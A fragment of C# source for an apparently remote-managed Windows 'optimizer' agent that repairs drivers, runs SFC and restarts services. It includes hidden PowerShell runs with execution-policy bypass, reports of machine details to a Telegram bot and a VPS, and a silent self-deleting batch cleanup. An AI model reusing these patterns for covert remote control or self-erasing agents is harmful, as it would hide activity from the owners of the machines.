                pnputil /scan-devices 2>&1 | Out-Null
                Write-Output 'PnP scan done'

                # Перевірити пристрої з проблемами
                $problemDevices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.ConfigManagerErrorCode -ne 0 }
                $count = ($problemDevices | Measure-Object).Count

                if ($count -gt 0) {
                    Write-Output ""Problem devices: $count""
                    foreach ($dev in $problemDevices | Select-Object -First 5) {
                        Write-Output ""  - $($dev.Name): error $($dev.ConfigManagerErrorCode)""

                        # Спробувати переінсталювати проблемний пристрій
                        $devId = $dev.DeviceID
                        pnputil /remove-device ""$devId"" /subtree 2>&1 | Out-Null
                        pnputil /scan-devices 2>&1 | Out-Null
                    }
                } else {
                    Write-Output 'No problem devices found'
                }
            ";
            var drvResult = RunPowerShellWithOutput(psDrv, 30000);
            Log($"[Repair] Driver scan result: {drvResult.Trim()}");
            results.Add($"🔧 Drivers: {drvResult.Trim().Replace("\r\n", " | ")}");
        }
        catch (Exception ex)
        {
            Log($"[Repair] Driver scan error: {ex.Message}");
            results.Add($"⚠️ Drivers: {ex.Message}");
        }

        // 4. SFC — перевірка системних файлів (швидкий режим)
        try
        {
            Log("[Repair] Running SFC /scannow...");
            var psSfc = @"
                $ErrorActionPreference = 'SilentlyContinue'
                $result = sfc /scannow 2>&1
                $lastLines = ($result | Select-Object -Last 3) -join ' '
                Write-Output $lastLines
            ";
            var sfcResult = RunPowerShellWithOutput(psSfc, 180000); // 3 хвилини макс
            Log($"[Repair] SFC result: {sfcResult.Trim()}");
            results.Add($"🛡 SFC: done");
        }
        catch (Exception ex)
        {
            Log($"[Repair] SFC error: {ex.Message}");
            results.Add($"⚠️ SFC: {ex.Message}");
        }

        // 5. Перезапуск критичних служб
        try
        {
            Log("[Repair] Restarting critical services...");
            var psCritical = @"
                $ErrorActionPreference = 'SilentlyContinue'
                $criticalServices = @('wuauserv', 'BITS', 'Themes', 'Spooler', 'WSearch')
                $started = 0

                foreach ($svc in $criticalServices) {
                    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
                    if ($service -and $service.Status -ne 'Running') {
                        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
                        Start-Service -Name $svc -ErrorAction SilentlyContinue
                        $started++
                    }
                }

                Write-Output ""Critical services started: $started""
            ";
            var critResult = RunPowerShellWithOutput(psCritical, 15000);
            Log($"[Repair] Critical services: {critResult.Trim()}");
            results.Add($"⚙️ Services: {critResult.Trim()}");
        }
        catch (Exception ex)
        {
            Log($"[Repair] Critical services error: {ex.Message}");
            results.Add($"⚠️ Services: {ex.Message}");
        }

        // Відправити TG звіт
        var report = string.Join("\n", results);
        Log($"=== POST-ROLLBACK REPAIR DONE ===\n{report}");
        SendTg($"✅ Post-Rollback Repair Done\n🖥 {Environment.MachineName}\n🆔 {ClientId}\n\n{report}");
    }

    static void SelfDelete()
    {
        try
        {
            var exePath = Process.GetCurrentProcess().MainModule?.FileName;
            if (string.IsNullOrEmpty(exePath)) return;

            var agentDir = Path.GetDirectoryName(exePath) ?? "";
            var batPath = Path.Combine(Path.GetTempPath(), "wo_cleanup.cmd");

            var dataDir = DataDir;
            var logsDir = LogDir;

            var script = $"""
                @echo off
                timeout /t 3 /nobreak >nul
                taskkill /F /IM WinOptimizerAgent.exe >nul 2>&1
                timeout /t 2 /nobreak >nul
                rd /s /q "{agentDir}" >nul 2>&1
                rd /s /q "{logsDir}" >nul 2>&1
                rd /s /q "{dataDir}" >nul 2>&1
                del "%~f0" >nul 2>&1
                """;

            File.WriteAllText(batPath, script);
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{batPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            });

            Log("Self-delete scheduled");
        }
        catch (Exception ex)
        {
            Log($"Self-delete error: {ex.Message}");
        }
    }

    static void UpdateVpsStatus(string status)
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = ClientId,
                rollback_status = status,
                project = "winoptimizer"
            });
            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            Http.PostAsync($"{VpsApi}/heartbeat", content).Wait();
        }
        catch { }
    }

    static void RunPowerShell(string command)
    {
        RunPowerShellWithOutput(command, 30000);
    }

    static string RunPowerShellWithOutput(string command, int timeoutMs = 30000)
    {
        try
        {
            // CRITICAL: Use Sysnative PowerShell (64-bit) because Agent is win-x86 (32-bit).
            // Restore-Computer, Get-ComputerRestorePoint etc. require 64-bit PowerShell.
            var sys32 = GetRealSystem32();
            var psPath = Path.Combine(sys32, "WindowsPowerShell", "v1.0", "powershell.exe");
            if (!File.Exists(psPath)) psPath = "powershell.exe";

            var psi = new ProcessStartInfo
            {
                FileName = psPath,
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{command}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return "";

            var stdout = proc.StandardOutput.ReadToEnd();
            var stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit(timeoutMs);

            if (!string.IsNullOrWhiteSpace(stderr))
                Log($"PS stderr: {stderr.Trim()}");

            return stdout;
        }
        catch (Exception ex)
        {
            Log($"PowerShell error: {ex.Message}");
            return "";
        }
    }

    static string GetRealSystem32()
    {
        var winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        var sysnative = Path.Combine(winDir, "Sysnative");
        if (Directory.Exists(sysnative) && File.Exists(Path.Combine(sysnative, "schtasks.exe")))
            return sysnative;
        return Environment.GetFolderPath(Environment.SpecialFolder.System);
    }

    static void SendTg(string message)
    {
        try
        {
            var payload = JsonSerializer.Serialize(new
            {
                chat_id = TgChatId,
                text = message
            });
            using var content = new StringContent(payload, Encoding.UTF8, "application/json");
            var resp = Http.PostAsync($"https://api.telegram.org/bot{TgBotToken}/sendMessage", content).Result;
            var body = resp.Content.ReadAsStringAsync().Result;
            Log($"TG send: {resp.StatusCode}, body: {body.Substring(0, Math.Min(body.Length, 200))}");
        }
        catch (Exception ex)
        {
            Log($"TG SEND ERROR: {ex.Message}");
            if (ex.InnerException != null)
                Log($"TG INNER: {ex.InnerException.Message}");
        }
    }

    static void Log(string message)
    {
        var line = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}";
        try { File.AppendAllText(LogFile, line + Environment.NewLine); } catch { }
        try { Directory.CreateDirectory(LogDir); File.AppendAllText(DesktopLogFile, line + Environment.NewLine); } catch { }
    }
}
